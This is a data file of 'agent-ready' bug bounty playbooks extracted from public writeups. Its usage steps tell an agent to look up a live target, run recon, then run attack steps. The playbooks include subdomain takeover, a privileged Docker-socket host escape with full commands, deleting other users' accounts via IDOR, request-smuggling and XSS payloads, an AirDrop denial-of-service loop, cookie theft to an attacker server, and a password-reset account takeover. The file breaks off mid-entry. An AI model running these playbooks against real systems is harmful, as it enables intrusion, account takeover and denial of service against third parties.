description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: How I Took Over 2 Subdomains with Azure CDN Profiles

trigger_conditions.when_to_apply: When subdomains are found with CNAME records pointing to azureedge.net domains that are no longer actively provisioned.
prerequisites: Attacker has a free or pay-as-you-go Azure account.
applicability_signals: Subdomain's CNAME record resolves to an *.azureedge.net domain.
The target azureedge.net domain responds with NXDOMAIN or indicates it's not provisioned.
skip_if: Subdomain CNAME points to an actively provisioned Azure CDN Profile.
Subdomain CNAME does not point to any Azure-related domain.

recon_steps: Step 1: Enumerate subdomains using tools like Subfinder and MassDNS.
Step 2: For each subdomain, check its CNAME record using 'dig' or similar tools. Look for CNAMEs resolving to *.azureedge.net.
Step 3: Verify if the target azureedge.net domain is provisioned by attempting to access it or checking its DNS resolution status (e.g., expecting NXDOMAIN for vacant profiles).
attack_steps: Step 1: Create a free/pay-as-you-go Azure account on portal.azure.com.
Step 2: In the Azure portal, create a new CDN Profile.
Step 3: When configuring the CDN Endpoint, enter the previously enumerated *.azureedge.net domain. If it shows as available (green indicator), it's likely vulnerable.
Step 4: Configure the CDN Endpoint to route traffic to your own web server (e.g., a simple PoC page hosted on your server).
Step 5: Within the CDN Profile settings, ensure the 'Custom Domain' is set to the original vulnerable subdomain.
Step 6: After making changes to your web server content, use the 'Purge' option within the CDN Profile to clear the cache and ensure your updated content is served.
payloads_or_patterns: Basic HTML PoC page hosted on attacker's web server.
tools_recommended: Subfinder: For subdomain enumeration.
MassDNS: For fast DNS resolution and CNAME checking.
Azure Portal: To create and manage CDN Profiles.
Web Server (e.g., Nginx, Apache, or a simple static host): To serve the PoC page.
success_indicators: Accessing the original subdomain via a web browser resolves to the attacker's PoC page.
The response headers from the subdomain indicate it's being served by Azure CDN.
failure_indicators: Azure portal indicates the *.azureedge.net domain is already in use when creating the CDN Profile. → The subdomain is not vulnerable to takeover via this method. → Continue enumeration for other subdomains or different cloud provider services.
The subdomain resolves to Azure's default CDN page instead of the attacker's PoC. → Double-check 'Custom Domain' configuration in CDN Profile, ensure CDN cache is purged.

playbooks.impact: Attacker can serve arbitrary content on the in-scope subdomain, potentially leading to phishing, hosting malicious files, or defacement.
playbooks.key_lesson: When enumerating subdomains with CNAMEs pointing to cloud provider services (like Azure CDN), verify if the underlying resource is provisioned and available for takeover.

meta.title: 4 Google Cloud Shell bugs explained

tech_stack_fingerprints: Running inside a Docker container (detected via /proc/1/environ)
Kubernetes is used for orchestration (detected via /etc/kubernetes/manifests/)

trigger_conditions.when_to_apply: When a user is provided with a Google Cloud Shell instance that has both a local Docker socket and a host Docker socket accessible.
prerequisites: User is able to access and execute commands within the Google Cloud Shell environment.
applicability_signals: Presence of `/run/docker.sock` and `/google/host/var/run/docker.sock` within the Cloud Shell environment.
The `docker` command-line tool is available within the Cloud Shell.
skip_if: The `/google/host/var/run/docker.sock` is not accessible or does not exist.
The `docker` command is not available in the Cloud Shell.

recon_steps: Step 1: Execute `ps aux` inside the Cloud Shell to observe running processes and identify if it's a containerized environment.
Step 2: Inspect `/proc/1/environ` to confirm the use of Docker and Kubernetes.
Step 3: Check for the existence of `/run/docker.sock` and `/google/host/var/run/docker.sock`.
attack_steps: Step 1: Use the host Docker socket to pull a minimal image (e.g., `alpine:latest`). Command: `sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest`

Step 2: Run a new privileged container, mounting the host's root filesystem and critical directories, and setting host networking. Command: `sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest`
Step 3: Start the created container. Command: `sudo docker -H unix:///google/host/var/run/docker.sock start LiveOverflow-container`
Step 4: Execute commands within the container with host root privileges. Command: `sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh`
payloads_or_patterns: sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
tools_recommended: Standard Linux command-line tools (ps, docker)
success_indicators: Successful execution of commands with root privileges on the host system.
Ability to mount and access the host's root filesystem (`/rootfs`) from within the spawned container.
failure_indicators: `docker` command not found within Cloud Shell.
`/google/host/var/run/docker.sock` does not exist or returns permission denied errors.
Errors during `docker run` command indicating insufficient privileges or missing capabilities.

playbooks.impact: Full Remote Code Execution (RCE) on the host machine, granting the attacker root access to all GCP resources associated with the compromised user's account. This includes accessing and manipulating data, deploying resources, and potentially escalating privileges within the cloud environment.
playbooks.key_lesson: When within a containerized environment, always check for accessible Docker sockets, especially those pointing to the host, as they can provide a direct path to RCE and full host compromise.

meta.title: Authorization bug that every bug hunter missed on a popular program

trigger_conditions.when_to_apply: When an authenticated user can access their account information and the system uses UUIDs for user identification.
prerequisites: Attacker has an authenticated session on the target application.
applicability_signals: An endpoint exists that returns user information, such as `/backend/usrInfo?type=true`.
The response contains a `usr_ID` field, which is a UUID.
The endpoint is accessible via a GET request but can be manipulated to perform DELETE operations.
skip_if: User IDs are sequentially guessable.
The application explicitly validates the session owner against the requested `usr_ID` before performing any action.

recon_steps: Browse to account settings and monitor traffic using Burp Suite or a similar proxy.
Identify endpoints that retrieve user information and note the HTTP method, parameters, and response structure.
attack_steps: Step 1: Send a GET request to `/backend/usrInfo?type=true` using your authenticated session to observe the response and extract your `usr_ID`.
Step 2: Change the HTTP method of the request to DELETE. Observe the response; if an error like 'Usr id cannot be empty' is returned, proceed.
Step 3: Modify the request to include the `usr_ID` in the query string: `DELETE /backend/usrInfo?usr_ID=<TARGET_USER_ID>`.
Step 4: If a 200 OK response is received, this indicates the account associated with `<TARGET_USER_ID>` has been deleted.
tools_recommended: Burp Suite: Use the Repeater module to modify HTTP methods and parameters.
Postman: To craft and send specific HTTP requests.
success_indicators: Receiving a 200 OK response to the DELETE request when targeting another user's `usr_ID`.
Confirmation that the targeted user's account is no longer accessible or has been permanently deleted.
failure_indicators: Receiving a 403 Forbidden or a specific error indicating insufficient permissions when attempting the DELETE request.
Receiving an error indicating an invalid `usr_ID` format, even when correctly formatted, which might suggest server-side validation beyond just presence.

playbooks.impact: Permanent deletion of any user's account if the attacker can obtain their `usr_ID`.
playbooks.key_lesson: Always attempt to change the HTTP method of endpoints, especially those that retrieve sensitive information, as they might implicitly support destructive operations like DELETE without proper authorization checks.

meta.title: Multiple Host Header Attacks after bypassing protection with... a Header Attack

tech_stack_fingerprints: API responds to Host header manipulation with unexpected status codes (e.g., 200 for invalid keys, 301 for non-existent directories)

trigger_conditions.when_to_apply: When an API endpoint requires a specific API key but responds with a 403 Forbidden error for missing or invalid keys, and exhibits unusual behavior when the Host header is manipulated.
prerequisites: The target API accepts a `X-API-KEY` header.
applicability_signals: API returns 403 Forbidden for missing/invalid `X-API-KEY`.
Manipulating the `Host` header results in a 200 OK response even with invalid API keys.
Some directories return 301 redirects that can be influenced by the `Host` header.
skip_if: All requests, regardless of Host header, return 403 for invalid API keys.
No 301 redirects are observed or are not controllable via the Host header.

recon_steps: Send requests to `https://api.example.com/<some_path>` without a valid `X-API-KEY` header.
Observe the response status code. If it's 403, proceed.
Send the same request, but manipulate the `Host` header to a different value (e.g., `localhost`). Observe the response code. If it becomes 200, this is a potential Host header injection.
Use a wordlist to fuzz common directories on `https://api.example.com/FUZZ` while setting the `Host` header to `localhost`. Look for endpoints that return 301 status codes.
attack_steps: Send a GET request to `https://api.example.com/robots.txt` with a manipulated `Host` header (e.g., `Host: localhost`).
If the `robots.txt` is accessible (response 200), analyze its content for sensitive paths.

For directories identified in `robots.txt` or found via fuzzing that return 301 redirects, send a GET request to these directories with a manipulated `Host` header (e.g., `Host: <attacker_controlled_domain>`).
Observe the `Location` header in the 301 response to confirm redirection to the attacker-controlled domain.
payloads_or_patterns:
GET /robots.txt HTTP/1.1
Host: localhost
GET /FUZZ HTTP/1.1
Host: localhost
GET /directory HTTP/1.1
Host: <attacker_controlled_domain>
tools_recommended: curl: for sending crafted HTTP requests.
ffuf: for directory fuzzing with custom headers. Example command: `ffuf -w big.txt -u "https://api.example.com/FUZZ" -H "Host: localhost" -mc 301`
success_indicators: Accessing `/robots.txt` or other sensitive files with a manipulated `Host` header returns a 200 OK status code.
Directories that previously returned 403 or other errors now return a 301 redirect when the `Host` header is manipulated to a different value.
The `Location` header of a 301 redirect points to an attacker-controlled domain.
failure_indicators: All Host header manipulations result in 403 Forbidden or other error codes, indicating no bypass.
No 301 redirects are observed for any paths, or the redirects are not controllable via the Host header.
The target doesn't respond with different status codes based on the Host header.

playbooks.impact: Unauthorized access to internal files like `robots.txt`, potential for further directory traversal and information disclosure. Manipulation of redirects can lead to open redirect vulnerabilities or further exploitation by directing users to malicious sites.
playbooks.key_lesson: Always test the Host header for injection vulnerabilities, especially when authentication mechanisms are in place but can be bypassed or when unexpected status codes are returned for resource requests.

meta.title: $500 getClass

trigger_conditions.when_to_apply: Applicable when Google Apps Script allows introspection of Java objects through the Rhino engine, specifically when certain enumeration objects expose a `getClass()` method.
prerequisites: Authenticated access to Google Apps Script.
applicability_signals: Presence of enumeration objects with a publicly accessible `getClass()` method (e.g., `Utilities.Charset.getClass()`).
Observation that methods returning arrays are allowed to proceed without strict filtering.
skip_if: WAF blocks calls to `getClass()`.
The Rhino engine has been patched to disallow `getClass()` on enumerations.
No methods returning arrays are available for exploitation.

recon_steps: Step 1: Identify enumeration objects within Google Apps Script that might expose a `getClass()` method. Example: `Utilities.Charset`.
Step 2: Attempt to call `getClass()` on identified enumeration objects to retrieve Java Class objects.
Step 3: Inspect the methods of the returned Java Class objects. Note that most are likely to be filtered by a whitelist.
Step 4: Identify methods that return arrays. These are crucial as they bypass stricter filtering.
Step 5: Experiment with array methods like `shift()` to see if they return objects wrapped in whitelisted classes.
attack_steps: Step 1: Execute Google Apps Script code calling `Utilities.Charset.getClass()` to obtain a Java Class object.
Step 2: Call a method on the retrieved Class object that returns an array (e.g., a method that internally retrieves and returns an array of objects).
Step 3: Apply the `shift()` method to the resulting JavaScript array. This will return the first element, which is expected to be wrapped in a whitelisted class.
Step 4: Send the wrapped object to `Logger.log()` to obtain a string representation for analysis.
Step 5: Analyze the string representation from `Logger.log()` for interesting internal class names or sensitive information.
tools_recommended: Google Apps Script editor for writing and executing JavaScript code.
Browser's developer console for observing `Logger.log()` output.
success_indicators: Logger output revealing internal Java class names (e.g., `com.google.apps.maestro.server.beans.memegen.api.MemegenService`).
String representation of the wrapped object contains sensitive or unexpected information about Google's internal services.
failure_indicators: Execution fails when calling `getClass()`.
Execution fails when attempting to call methods on the Java Class object.
Execution fails when attempting to iterate over the array or use `shift()`.
Logger output shows no interesting internal class names or data.
All attempts to obtain Java Class objects are blocked by the whitelist.

playbooks.impact: Information disclosure about internal Google services and infrastructure, potentially revealing sensitive class names or configurations that could be used in further attacks.
playbooks.key_lesson: When exploiting sandboxed environments like Google Apps Script, investigate methods that return arrays as they may bypass filtering mechanisms, and leverage `Logger.log()` to observe string representations of internal objects.

meta.title: AirDoS: Remotely render any nearby iPhone or iPad unusable

trigger_conditions.when_to_apply: This attack is applicable when targeting nearby iOS devices that have their AirDrop receiving setting set to 'Everyone'. The attacker must be within AirDrop range.
prerequisites: Target iOS device is within AirDrop range of the attacker.
Target iOS device's AirDrop receiving setting is 'Everyone'.
applicability_signals: Observable presence of nearby iOS devices.
Knowledge that a target device's AirDrop is set to 'Everyone'.
skip_if: Target iOS device's AirDrop receiving setting is 'Contacts Only' or 'Receiving Off'.
Target device is out of AirDrop range.
Target device has Wi-Fi or Bluetooth disabled (or can quickly disable them).

recon_steps: Step 1: Identify nearby iOS devices that may be vulnerable.
Step 2: (Optional, if possible) Attempt to ascertain the AirDrop receiving settings of target devices (though this is generally not feasible passively).
attack_steps: Step 1: Utilize a tool like 'opendrop' to send a large number of AirDrop requests to nearby iOS devices.
Step 2: Configure the tool to continuously send AirDrop requests (e.g., using a while loop).
Step 3: Observe the target devices for the AirDrop share popup appearing repeatedly, blocking the UI.
Step 4: Continue sending requests until the target device becomes unusable due to the persistent popup.
payloads_or_patterns: while true ; do opendrop send -r 0 -f totally-random-file ; done
tools_recommended: opendrop: For sending AirDrop requests.
Custom script with a loop to automate sending requests.
success_indicators: Target iOS device displays a persistent, non-dismissible AirDrop share popup.
User on the target device is unable to interact with the device's interface except to accept or decline the AirDrop request, which reappears.
The attack persists even after locking and unlocking the device.
failure_indicators: No AirDrop popup appears on the target device (may indicate 'Contacts Only' or 'Receiving Off' setting, or out of range). Pivot: Try to find targets with 'Everyone' setting.
The AirDrop popup appears but can be easily dismissed and does not reappear (may indicate a patched version or rate limiting). Pivot: Confirm iOS version, if possible, and consider other DoS vectors.
Received a 403 Forbidden or similar error from the AirDrop service (unlikely for this specific vulnerability).

playbooks.impact: Renders target iOS devices unusable by blocking the user interface with a persistent AirDrop share popup, forcing the user to either accept or decline an infinite stream of requests. This prevents any other interaction with the device.
playbooks.key_lesson: When testing for DoS on mobile devices, consider vulnerabilities in core communication or sharing protocols like AirDrop that can be abused to create disruptive user interface states.

meta.title: Telegram for macOS file:// link rendering and NSWorkspace.open RCE

affected_components: URL parsing logic in website preview rendering

trigger_conditions.when_to_apply: When a user receives or interacts with a message containing a link that triggers Telegram's website preview functionality.
prerequisites: The target user must be using Telegram for macOS version 4.9.155353 or earlier.
The target user must interact with a link that triggers a website preview.
The attacker must be able to send a link to the target user.
The attacker must be able to host an HTML file at the provided link.
applicability_signals: Telegram client rendering website previews for external links.
Observed handling of `file://` and other URI schemes within these previews.
skip_if: Telegram client has been updated to patch the URL parsing and handling of `file://` URIs.
Website preview functionality is disabled or not triggered for the specific link.

recon_steps: Verify the target user is running a vulnerable version of Telegram for macOS (v4.9.155353 or below).
Identify if the Telegram client renders website previews for links shared in messages.
attack_steps: Step 1: Create an HTML file (e.g., `exploit.html`) containing a `meta` tag with `og:title` pointing to a `file://` URI scheme, e.g., `<meta property="og:title" content="file://google.com/bin/sh">`.
Step 2: Host the `exploit.html` file on a publicly accessible web server.
Step 3: Send a link to the hosted `exploit.html` file to the target user within Telegram.
Step 4: Encourage the target user to interact with the link, which will trigger the website preview.
Step 5: Observe if Telegram renders the `file://` URI as a clickable link within the preview.
Step 6: If rendered, instruct the target user to click on the `file://` link.
Step 7: If the link points to an executable, observe if `NSWorkspace.open` is invoked and executes the arbitrary code. For `ssh://` links, observe if Terminal.app launches with an active SSH session.
tools_recommended: Web server (e.g., Nginx, Apache) to host the exploit HTML.
URL shortener if needed.
success_indicators: The `file://` URI is rendered as a clickable link in the Telegram website preview.
An arbitrary executable is launched on the target machine.
A file is opened on the target machine.
An arbitrary application is launched via URI schemes.
Terminal.app opens with an active SSH session for `ssh://` links, displaying user info.
failure_indicators: The `file://` URI is not rendered as a clickable link.
Clicking the link results in an error or no action.
Telegram client displays a security warning or blocks the action.

playbooks.impact: Arbitrary code execution on the target user's macOS machine. This can include running any executable, opening arbitrary files, launching applications via URI schemes, and disclosing sensitive information such as the OS username, IP address, and other system details.
playbooks.key_lesson: Sanitize and strictly validate all URI schemes parsed from external inputs, especially when they are rendered in previews or handled by system-level handlers like `NSWorkspace.open`.

meta.title: HTML Injection to XSS bypass in [REDACTED.com]

trigger_conditions.when_to_apply: When a web application allows users to create named chat rooms and does not properly sanitize the room name input, allowing HTML/JavaScript execution.
prerequisites: The target application has a chat room feature where users can define a room name.
applicability_signals: The presence of a 'Create Room' functionality, and an input field for the room name.
skip_if: The room name input is strictly validated to prevent HTML/script tags.
A WAF blocks common XSS payloads.

recon_steps: Step 1: Navigate to the chat room creation URL: https://<redacted.com>/<redacted>/chat
Step 2: Observe the 'Create Room' functionality and identify the input field for the room name.
attack_steps: Step 1: In the 'Room Name' input field, enter the payload: <input/onfocus=prompt(document.domain) autofocus>
Step 2: Click 'Ok' to create the room.
Step 3: Observe the created room name. It should render as an input box.
Step 4: Type any text into the input box that now represents the room name.
Step 5: Observe if the JavaScript payload (prompt(document.domain)) executes.
tools_recommended: Burp Suite (for intercepting and modifying requests if needed, though not strictly necessary for this POC)
Browser Developer Tools (to observe DOM manipulation and script execution)
success_indicators: An input box is displayed where the room name should be.
Typing into the input box triggers a JavaScript alert box displaying the document domain (e.g., a prompt box showing 'redacted.com').
failure_indicators: The payload is displayed as plain text and no input box appears (sanitization is working).
A WAF blocks the request with a 403 Forbidden response.
The input box appears but typing in it does not trigger any JavaScript (e.g., focus event is not firing correctly or is being blocked).

playbooks.impact: Execution of arbitrary JavaScript in the context of the vulnerable page. This can lead to session hijacking (cookie stealing), phishing attacks, defacement, or performing actions on behalf of the user.
playbooks.key_lesson: Always sanitize user-provided input, especially when it's rendered directly in HTML, to prevent HTML injection and cross-site scripting (XSS) vulnerabilities.

meta.title: Google Chrome portal element fuzzing

trigger_conditions.when_to_apply: When a web application uses the portal element and an attacker can influence the HTML content that gets rendered or processed by Chrome's portal implementation.
prerequisites: The target web application utilizes the portal element (portal.html).
applicability_signals: Discovery of 'portal.html' in the HTML source or via network requests.
The application allows for injection or manipulation of HTML content that is rendered.
skip_if: The application does not use the portal element.
The application has strict Content Security Policy (CSP) that prevents rendering of external or malformed HTML.

recon_steps: Step 1: Inspect the HTML source of the target web application for references to 'portal.html' or any elements that might be rendered using Chrome's portal functionality.
Step 2: Analyze how the application handles user-provided or dynamically generated HTML content to identify potential injection points.
attack_steps: Step 1: Craft an HTML payload that specifically targets the portal element with malformed or unexpected input to trigger a Use-After-Free vulnerability.
Step 2: Inject the crafted payload into an identified injection point on the target web application.
Step 3: Observe Chrome's behavior when rendering the compromised page, looking for crashes or anomalous behavior indicative of a Use-After-Free.
tools_recommended: Browser Developer Tools: For inspecting HTML and observing rendering behavior.
Fuzzing frameworks: For automated generation of malformed HTML payloads.
success_indicators: Browser crash (e.g., Chrome rendering engine process terminates unexpectedly).
Observing memory corruption indicators through debugging tools, if available.
Detection of crashes via a crash reporting mechanism if the target application has one.
failure_indicators: No browser crash and normal page rendering indicates the payload was not effective or the portal element is not being used in a vulnerable manner.
A 4xx or 5xx error response from the server suggests the injected HTML was blocked or caused a server-side issue, not necessarily a client-side UAF.

playbooks.impact: Remote Code Execution (RCE) or memory corruption leading to denial of service (DoS) on the user's browser.
playbooks.key_lesson: When dealing with web applications that render user-controlled HTML, thoroughly investigate the handling of specific HTML elements like the 'portal' element for potential memory corruption vulnerabilities.

meta.title: HTTP Request Smuggling + IDOR
meta.programs: hipotermia HTB SwagShop OneTwoSeven Arkham Fortune LaCasaDePapel CTF FriendZone Netmon Querier Flujab Help Sizzle Chaos Conceal Lightweight Irked Teacher RedCross Vault Curling Frolic Carrier Access Zipper Giddy Ypuffy SecNotes Guides Blind XSS with vaya-ciego-nen BugBounty BugPoC LFI Challenge h1-2006 CTF

tech_stack_fingerprints: CL.TE HTTP request smuggling vulnerability signature (response to crafted request)

trigger_conditions.when_to_apply: This technique is applicable when a web application exhibits HTTP request smuggling vulnerabilities (specifically CL.TE) and also contains endpoints that are vulnerable to Insecure Direct Object Reference (IDOR) without proper authorization checks.
prerequisites: The target must be vulnerable to HTTP Request Smuggling using the CL.TE (Content-Length: Transfer-Encoding) vulnerability.
There must be an endpoint that performs an action on behalf of a user based on their ID, without adequately verifying the user's session or ownership of the target ID.
applicability_signals: An endpoint that responds differently based on the `Transfer-Encoding` and `Content-Length` headers.
An endpoint like `/addCard/<user_id>` that accepts user identifiers in the URL path and processes requests without strong session validation for the target user ID.
skip_if: The application correctly validates session tokens and user ownership for all actions, even when manipulated via HTTP request smuggling.
All HTTP requests are processed in strict sequential order without any possibility of request queue manipulation.

recon_steps: Step 1: Use Burp Suite's Request Smuggler plugin or manually craft requests to detect CL.TE HTTP request smuggling. Look for differences in how the front-end and back-end servers handle `Content-Length` and `Transfer-Encoding` headers.

Step 2: Confirm the CL.TE vulnerability by sending a crafted request (e.g., POST with chunked encoding and a short Content-Length) followed by a simple request (e.g., GET /). Observe if the simple request is processed as part of the smuggled payload.
attack_steps: Step 1: Craft a malicious HTTP request that exploits the CL.TE smuggling. This request should attempt to smuggle a request targeting an IDOR-vulnerable endpoint.

Step 2: Design the smuggled request to perform an action (e.g., add a card) on behalf of a target user (identified by their ID) using the IDOR vulnerability. The user ID used in the smuggled request should be the attacker's own user ID.

Step 3: Send the crafted smuggling request, immediately followed by the sequence of requests that will be processed by the back-end server, thus allowing the smuggled request to be prepended to a legitimate user's request.
Step 4: Monitor for the successful execution of the smuggled action (e.g., a credit card being added to the attacker's account, which was intended for another user).
payloads_or_patterns:
POST / HTTP/1.1
Transfer-Encoding: chunked
Host: <TARGET_URL_HOST>
Content-Length: 70
Foo: bar
0
POST /addCard/<OWN_USER_ID> HTTP/1.1
Host: <TARGET_URL_HOST>
Content-Type: application/json
Content-Length: 83

{"name": "Name","card": "12345", "exp": "00/00", "cvv": "000"}
tools_recommended: Burp Suite (Proxy, Repeater, Turbo Intruder)
Burp Suite Request Smuggler plugin
success_indicators: An action (like adding a credit card) is performed on the attacker's account that was intended for a different user.
The response to the smuggled request indicates successful processing of the IDOR action, and this action is reflected in the attacker's account context.
The response shows a 200 OK for the smuggled POST to /addCard/<OWN_USER_ID> and the card is visible in the attacker's account.
failure_indicators: Responses indicate that the smuggled request was not processed or was rejected by the back-end (e.g., 400 Bad Request, 404 Not Found for the smuggled request). Pivot: If the smuggled request itself fails, try modifying the smuggled request path or headers to match potential internal routing.

All requests are processed sequentially without any modification, indicating no successful request smuggling. Pivot: If smuggling fails, focus solely on the IDOR vulnerability or explore other smuggling techniques (e.g., TE.CL).

playbooks.impact: An attacker can perform actions on behalf of other authenticated users, such as adding credit cards, modifying sensitive information, or accessing data associated with another user, by chaining HTTP Request Smuggling with an IDOR vulnerability. This leads to account takeover or unauthorized data access.
playbooks.key_lesson: Always test IDOR vulnerabilities in conjunction with HTTP request smuggling techniques, as smuggling can bypass intended access controls and enable unauthorized actions on behalf of other users.

meta.title: My first RCE: a tale of good ideas and good friends

affected_components: endpoints accepting file uploads or processing images

trigger_conditions.when_to_apply: When a web application processes image files and is vulnerable to the ImageTragick vulnerability, allowing for arbitrary file read or write.
prerequisites: The target must be running a vulnerable version of ImageMagick.
The target must have an endpoint that processes image files.
applicability_signals: Endpoints that accept image uploads.
Endpoints that display or manipulate uploaded images.
Subdomains containing the word 'image'.
skip_if: No observable image processing endpoints.
Application has explicit checks for malicious image files.
WAF blocks requests containing suspicious image file content.

recon_steps: Step 1: Use `meg` with a high volume of subdomains and a simple HTTP server payload to detect pings to the attacker's server, indicating potential SSRF or file read vulnerabilities. Target URL pattern: `/?url=http://<attacker_server_ip>/<filename>&file=http://<attacker_server_ip>/<filename>&path=...`
Step 2: Analyze server logs to identify which subdomain and potentially which parameter triggered a ping.
Step 3: If 'image' is present in the subdomain, host an image file on the attacker's server.
attack_steps: Step 1: Host a specially crafted image file on an attacker-controlled server.
Step 2: Send a request to the target application's image processing endpoint, pointing to the attacker-hosted image. Example: `curl -v <TARGET_URL>/url=http://<attacker_server_ip>/image.jpg`
Step 3: Observe the response for any indication of the image being processed or delivered.
Step 4: If the image is processed, check the downloaded image size from the target. A significantly different size than the original indicates potential file manipulation or read.
payloads_or_patterns: An image file crafted to exploit ImageTragick. The exact payload depends on the specific ImageTragick vulnerability being exploited (e.g., control characters in image metadata, specific image format vulnerabilities).
tools_recommended: meg: To scan a large number of subdomains with payloads.
python3 -m http.server: To host a simple HTTP server for receiving pings.
ffuf: As a more advanced fuzzer for parameter fuzzing and identifying vulnerable parameters.
unfurl: To extract domain names from host lists.
success_indicators: The target application downloads the image from the attacker's server.
The downloaded image from the target has a different file size than the original attacker-hosted image.
Specific error messages or content in the response indicating successful exploitation of ImageTragick.
failure_indicators: No ping received on the attacker's server.
Downloaded image size matches the original.
Application returns an error or blocks the request.
If initial SSRF/file read attempts fail, pivot to other fuzzing techniques for different parameters or file types.

playbooks.impact: Remote Code Execution (RCE) on the target server by exploiting the ImageTragick vulnerability, allowing arbitrary commands to be executed.
playbooks.key_lesson: When dealing with image processing functionalities, always consider vulnerabilities like ImageTragick and test by supplying crafted image files that could trigger unexpected behavior or code execution.

meta.title: Hacking GitHub with Unicode's dotless 'i'

trigger_conditions.when_to_apply: When a password reset function normalizes provided email addresses to a standard character set before comparison with stored email addresses.
prerequisites: Attacker can register an email address that normalizes to another user's email address using Unicode characters (e.g., using the Turkish dotless 'i').
The target email provider must allow Unicode characters in the local part of the email address.
GitHub's outgoing mail server does not block Unicode in the domain part for this specific flow.
applicability_signals: Password reset endpoint exists.
Email normalization logic is suspected.
Use of Unicode characters in email addresses is supported by the target's email provider.
skip_if: Password reset function performs exact string comparison without normalization.
Email provider rejects Unicode characters in the local part.
Target system explicitly validates email addresses against an allowlist of normalized characters only.

recon_steps: Identify the password reset endpoint for GitHub accounts.
Research common email normalization techniques and Unicode characters that can cause collisions (e.g., Turkish dotless 'i' 'ı' vs. English 'i').
attack_steps: Step 1: Construct a target email address using a Unicode character that normalizes to an existing GitHub user's email address (e.g., John@Gıthub.com where 'ı' is the dotless 'i').
Step 2: Initiate the password reset flow on GitHub using the constructed malicious email address.
Step 3: Monitor the email inbox associated with the attacker's crafted email address for the password reset token.
Step 4: If a password reset token is received, attempt to use it to reset the password for the targeted GitHub account.
payloads_or_patterns: Email address: John@Gıthub.com (where 'ı' is the Unicode dotless 'i' U+0131)
tools_recommended: Burp Suite: To intercept and modify requests during the password reset flow.
Email client: To receive the password reset token.
Unicode character lookup tools: To identify characters causing case mapping collisions.
success_indicators: Receiving a password reset email at the attacker-controlled email address for a different GitHub user's account.
Successfully resetting the password of a target GitHub user's account using the received token.
failure_indicators: Password reset email is not received or sent to the attacker's email address.
Password reset link is invalid or expired immediately.
GitHub rejects the constructed email address due to invalid characters (less likely if Unicode is supported by the provider).

playbooks.impact: Attacker can take over any GitHub account by initiating a password reset and receiving the reset token at an attacker-controlled email address that normalizes to the target user's email.
playbooks.key_lesson: Always ensure that email address comparisons during authentication or account recovery flows are performed using exact, normalized values, and consider the impact of Unicode normalization collisions.

meta.title: Reflected XSS in graph.facebook.com leads to account takeover in IE/Edge

trigger_conditions.when_to_apply: When the target application is known to be vulnerable to reflected XSS on the graph.facebook.com domain, specifically affecting older browsers like Internet Explorer and Edge.
prerequisites: Attacker can craft URLs targeting graph.facebook.com.
Victim uses Internet Explorer or Edge browser.
applicability_signals: Requests to graph.facebook.com that appear to reflect user-controlled input in the response without proper sanitization.
skip_if: WAF blocks common XSS payloads.
All requests to graph.facebook.com are properly sanitized and do not reflect user input.

recon_steps: Step 1: Identify parameters within graph.facebook.com requests that appear to be reflected in the response.
Step 2: Attempt basic XSS payloads (e.g., `<script>alert(1)</script>`) against identified parameters to confirm reflection.
attack_steps: Step 1: Craft a malicious URL targeting graph.facebook.com with a vulnerable parameter and an XSS payload designed to steal session cookies.
Step 2: Send the crafted URL to the victim.
Step 3: The victim clicks the link in an affected browser (IE/Edge).
Step 4: The reflected XSS executes, sending the victim's session cookie to an attacker-controlled server.
Step 5: Attacker uses the stolen cookie to impersonate the victim and potentially take over their account.
tools_recommended: Burp Suite: To intercept and modify requests, and to host the attacker-controlled server for cookie capture.
success_indicators: Attacker-controlled server receives the victim's session cookie.
Attacker can use the stolen cookie to access the victim's Facebook account without their credentials.
failure_indicators: No cookie is received by the attacker server → Indicates the XSS payload was not executed or the reflection point is not exploitable for cookie theft. Try different XSS payloads or investigate other parameters/endpoints.
Browser displays an error message or blocks the script execution → Indicates client-side protection or insufficient sanitization. Investigate specific browser behaviors or alternative XSS vectors.

playbooks.impact: Account takeover of the victim's Facebook account. This could lead to unauthorized posting, data theft, financial fraud, and further impersonation.
playbooks.key_lesson: Always test reflected XSS on API endpoints, especially those that might be processed differently by older browsers, as they can lead to account takeovers by stealing session cookies.

meta.title: Site Isolation bypass via Chrome extension

trigger_conditions.when_to_apply: This technique is applicable when an attacker has already achieved a renderer process compromise within Google Chrome and targets a user with the Google Input Tools extension installed.
prerequisites: Renderer process compromise
Google Input Tools extension installed on the target's browser
applicability_signals: The ability to inject JavaScript into a content script context for a specific extension (Google Input Tools in this case)
The presence of the `chrome.runtime.sendMessage` API in the extension's background script (`chext_backgroundpage.js`)
skip_if: The target is not using Google Chrome
The Google Input Tools extension is not installed
The attacker cannot achieve a renderer process compromise

recon_steps: Step 1: Identify if the target user has the Google Input Tools extension installed by observing installed extensions via browser fingerprinting or other means.

Step 2: Confirm the target is using a vulnerable version of Google Chrome where site isolation can be bypassed through the described method (requires detailed knowledge of Chrome versions and vulnerabilities).
attack_steps: Step 1: From the compromised renderer process, send a message to the extension's background script (`chext_backgroundpage.js`) using `chrome.runtime.sendMessage`.
Step 2: The message should contain parameters `sq: true`, a target `url` (e.g., `@mail.google.com/mail/u/0/`), and arbitrary `hd` (headers).
Step 3: The extension's background script, upon receiving this message, will trigger a POST request to the specified `url` with the given headers and default cookies.
Step 4: Observe the response logged by the content script to confirm data exfiltration.
payloads_or_patterns: chrome.runtime.sendMessage({ sq: true, url: "<TARGET_URL>", hd: { "<HEADER_NAME>": "<HEADER_VALUE>" } }, function(x) { console.log(x); })
tools_recommended: Browser developer tools (for injecting JavaScript into content scripts)
